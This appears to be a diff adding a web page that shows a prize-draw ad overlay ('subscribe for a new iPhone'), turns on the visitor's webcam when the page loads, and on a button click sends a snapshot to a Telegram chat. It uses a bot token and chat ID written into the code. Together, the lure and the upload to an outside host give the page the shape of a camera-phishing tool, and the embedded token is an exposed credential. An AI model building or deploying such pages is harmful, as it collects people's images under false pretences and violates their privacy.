@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Capture and Send</title>
+</head>
+<body>
+  <div id="ad-overlay">
+    <p>اشترك الآن للدخول في السحب على جهاز آيفون جديد!</p>
+    <button onclick="document.getElementById('ad-overlay').style.display = 'none'">أغلق الإعلان</button>
+  </div>
+
+  <video id="video" autoplay playsinline style="width: 100%; max-width: 600px;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+  <button id="capture">Capture & Send</button>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('capture');
+
+    const botToken = "7085032831:AAHpIvgwtiWAFDPOqqGnmg_l4RP57xGlQyY";
+    const chatId = "5198984934";
+
+    // بدء تشغيل الكاميرا
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (error) {
+        alert('Unable to access camera.');
+      }
+    }
+
+    // التقاط الصورة وإرسالها إلى Telegram
+    async function capturePhoto() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imgData = canvas.toDataURL('image/png'); // تحويل الصورة إلى بيانات Base64
+      const blob = await (await fetch(imgData)).blob(); // تحويلها إلى Blob
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', blob, 'snapshot.png');
+
+      // إرسال الصورة إلى Telegram
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData,
+        });
+
+        const result = await response.json();
+        if (result.ok) {
+          alert('تم إرسال الصورة بنجاح إلى Telegram!');
+        } else {
+          alert('حدث خطأ أثناء الإرسال.');
+          console.error(result);
+        }
+      } catch (error) {
+        console.error('An error occurred:', error);
+        alert('تعذر إرسال الصورة.');
+      }
+    }
+
+    captureButton.addEventListener('click', capturePhoto);
+
+    // بدء الكاميرا عند تحميل الصفحة
+    startCamera();
+  </script>
+</body>
+</html>
